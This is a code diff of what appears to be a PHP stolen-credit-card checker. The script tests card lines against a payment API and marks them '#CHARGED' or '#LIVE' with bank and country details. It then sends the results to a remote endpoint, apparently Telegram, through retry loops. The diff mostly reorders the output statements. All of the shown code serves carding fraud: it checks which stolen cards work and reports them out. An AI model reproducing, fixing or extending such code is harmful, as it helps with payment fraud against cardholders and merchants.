@@ -354,11 +354,11 @@ $sendinsufftotg = false;
 
 #############SUCCEEDED SUCCESS
  if (strpos($result1, '"status": "succeeded"')) {
-    echo "<span class='badge badge-success'>#CHARGED</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: green;' class='badge'>The payment transaction has been successfully processed <a href='$success'  target='_blank'>[ proof here ]</a> -Alice Schuberg</span> ";
     while (!$sendchargedtotg && $num_retries < $max_retries) {
     $sendchargedtotg = @file_get_contents($sendcharged);
     $num_retries++;
-    echo "\u{1F4B0}\u{2705}<br>"; // outputs 💰✅
+}
+    echo "<span class='badge badge-success'>#CHARGED</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: green;' class='badge'>The payment transaction has been successfully processed <a href='$success'  target='_blank'>[ proof here ]</a> -Alice Schuberg</span><br>";
     exit();
 }
 #############DECLINECODEcurl0
@@ -380,12 +380,11 @@ elseif($tos == "required") {
     exit();
 }
 if (strpos($curl0, '"insufficient_funds"')) {
-    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span> ";
     while (!$sendinsufftotg && $num_retries < $max_retries) {
     $sendinsufftotg = @file_get_contents($sendinsuff);
     $num_retries++;
-    echo "\u{1F4B8}\u{274C}<br>"; // outputs 💸❌
 }
+    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span><br>";
     exit();
 }
 
@@ -419,12 +418,11 @@ elseif($tos == "required") {
     exit();
 }
 if (strpos($curl1, '"insufficient_funds"')) {
-    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span> ";
     while (!$sendinsufftotg && $num_retries < $max_retries) {
     $sendinsufftotg = @file_get_contents($sendinsuff);
     $num_retries++;
-    echo "\u{1F4B8}\u{274C}<br>"; // outputs 💸❌
 }
+    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span><br>";
     exit();
 }
 
@@ -454,12 +452,11 @@ elseif($tos == "required") {
     exit();
 }
 if (strpos($result1, '"insufficient_funds"')) {
-    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span> ";
     while (!$sendinsufftotg && $num_retries < $max_retries) {
     $sendinsufftotg = @file_get_contents($sendinsuff);
     $num_retries++;
-    echo "\u{1F4B8}\u{274C}<br>"; // outputs 💸❌
 }
+    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span><br>";
     exit();
 }
 
